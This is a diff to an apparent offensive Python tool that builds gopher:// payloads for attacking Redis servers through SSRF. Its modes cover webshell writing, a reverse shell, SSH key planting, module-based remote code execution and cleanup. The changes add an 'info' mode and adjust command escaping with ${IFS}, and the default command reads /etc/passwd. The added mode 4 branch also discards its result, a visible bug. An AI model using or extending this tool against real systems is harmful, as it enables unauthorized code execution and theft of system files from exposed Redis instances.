@@ -6,6 +6,15 @@ try:
 except:
     from urllib.parse import quote
 
+def generate_info(passwd):
+    
+    cmd=[
+        "info",
+        "quit"
+        ]
+    if passwd:
+        cmd.insert(0,"AUTH {}".format(passwd))
+    return cmd
 
 def generate_shell(filename,path,passwd,payload):
     
@@ -56,7 +65,7 @@ def generate_rce(lhost,lport,passwd,command="cat /etc/passwd"):
         # "CONFIG SET dbfilename dump.rdb",
         # "system.exec rm${IFS}/tmp/{}".format(exp_filename),
         # "MODULE UNLOAD system",
-        "POST"
+        "quit"
         ]
     if passwd:
         cmd.insert(0,"AUTH {}".format(passwd))
@@ -67,7 +76,7 @@ def rce_cleanup():
     cmd=[
         "SLAVEOF NO ONE",
         "CONFIG SET dbfilename dump.rdb",
-        "system.exec rm${IFS}/tmp/{}".format(exp_filename),
+        "system.exec rm /tmp/{}".format(exp_filename).replace(" ","${IFS}"),
         "MODULE UNLOAD system",
         "POST"
         ]
@@ -120,6 +129,8 @@ def generate_payload(ip,port,passwd,mode):
     elif mode==31:
         cmd=rce_cleanup()
 
+    elif mode==4:
+        generate_info(passwd)
     protocol="gopher://"
     payload=protocol+ip+":"+port+"/_"
 
@@ -131,12 +142,14 @@ def generate_payload(ip,port,passwd,mode):
 
 if __name__=="__main__":   
 
-    # 0 for webshell ; 1 for re shell ; 2 for ssh key ; 3 for redis rce ; 31 for rce clean up
+    # 0 for webshell ; 1 for re shell ; 2 for ssh key ; 
+    # 3 for redis rce ; 31 for rce clean up
+    # 4 for info
     # suggest cleaning up when mode 3 used
-    mode=3 
+    mode=3
 
-    # need auth or not
-    passwd = False 
+    # input auth passwd or leave blank for no pw
+    passwd = '' 
 
     ip="127.0.0.1"
     port="6379"
